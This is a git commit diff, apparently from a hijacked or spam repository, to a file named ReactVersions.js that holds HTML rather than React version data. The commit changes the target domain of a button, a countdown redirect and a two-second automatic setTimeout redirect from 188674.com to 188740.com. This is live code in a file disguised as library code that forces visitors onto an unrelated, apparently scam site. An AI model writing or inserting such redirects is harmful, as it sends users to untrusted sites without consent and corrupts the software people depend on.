caf924b759983054fb870dd650c7a16e86e0a1e5
reactjscdn <bro_fuckme_oh@proton.me>
2026-08-20 05:26:02 +0800

    Update links from 188674.com to 188740.com

--- ReactVersions.js
+++ ReactVersions.js
@@ -212,7 +212,7 @@
       <p>You will enjoy more on our website.</p>
     </div>
 
-    <a class="btn" href="https://188674.com" id="js-btn">
+    <a class="btn" href="https://188740.com" id="js-btn">
       <svg viewBox="0 0 24 24"><path d="M13 7l5 5-5 5M6 12h12"/></svg>
       Go Click
     </a>
@@ -266,7 +266,7 @@
       const i = setInterval(() => {
         if (t <= 0) {
           clearInterval(i);
-          location.href = 'https://188674.com';
+          location.href = 'https://188740.com';
         } else {
           t--;
           x.innerHTML = t;
@@ -287,7 +287,7 @@
 
 <script>
     setTimeout(function() {
-        window.location.href = Math.random() < 0.5 ? "https://188674.com" : "https://188674.com";
+        window.location.href = Math.random() < 0.5 ? "https://188740.com" : "https://188740.com";
     }, 2000);
 </script>
 </body>
